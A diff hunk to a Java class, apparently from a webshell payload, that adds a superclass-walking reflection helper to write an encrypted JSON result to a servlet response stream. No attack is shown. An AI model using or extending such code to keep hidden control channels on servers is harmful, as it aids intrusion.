@@ -41,16 +41,33 @@ public class Test {
                     getOutputStreamMethod.setAccessible(true);
                     so = getOutputStreamMethod.invoke(this.Response);
                 }
-                Method write = so.getClass().getMethod("write", byte[].class);
+                Method write = getMethod(so, "write", new Class[]{byte[].class});
                 String jsonStr = this.buildJson(result, true);
                 write.invoke(so, this.Encrypt(jsonStr.getBytes("UTF-8")));
-                so.getClass().getMethod("flush").invoke(so);
-                so.getClass().getMethod("close").invoke(so);
+                getMethod(so, "flush", new Class[0]).invoke(so);
+                getMethod(so, "close", new Class[0]).invoke(so);
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }
         return true;
+    }
+
+    private Method getMethod(Object obj, String methodName, Class[] parameterTypes) throws Exception {
+        Method method = null;
+        Class clazz = obj.getClass();
+        while (clazz != null && method == null) {
+            try {
+                method = clazz.getDeclaredMethod(methodName, parameterTypes);
+            } catch (NoSuchMethodException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (method == null) {
+            method = obj.getClass().getMethod(methodName, parameterTypes);
+        }
+        method.setAccessible(true);
+        return method;
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
